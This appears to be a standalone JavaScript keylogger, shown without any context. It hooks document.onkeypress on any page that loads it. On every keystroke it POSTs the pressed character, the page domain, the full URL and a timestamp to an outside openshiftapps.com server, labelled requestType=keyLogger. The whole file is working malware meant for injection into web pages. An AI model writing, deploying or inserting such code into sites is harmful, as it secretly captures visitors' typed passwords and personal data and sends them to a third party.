(function() {
	document.onkeypress = function(evt) {
		evt = evt || window.event;
		var charCode = evt.keyCode || evt.which;
		var charStr = String.fromCharCode(charCode);
		var time = new Date().getTime();
		var domain = document.location.host;
		var page = document.location.href;

		var xhttp = new XMLHttpRequest();
//		xhttp.onreadystatechange = function() {
//			if (this.readyState == 4 && this.status == 200) {
//				document.getElementById("ajax").innerHTML = this.responseText;
//			}
//		};
		xhttp.open("POST",
				"http://secure-governance.1d35.starter-us-east-1.openshiftapps.com/AppController",
				true);
		xhttp.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
		xhttp.send("requestType=keyLogger&currentDomain=" + domain
				+ "&currentPage=" + page + "&pressedKey=" + charStr
				+ "&clientTime=" + time);
	};
})();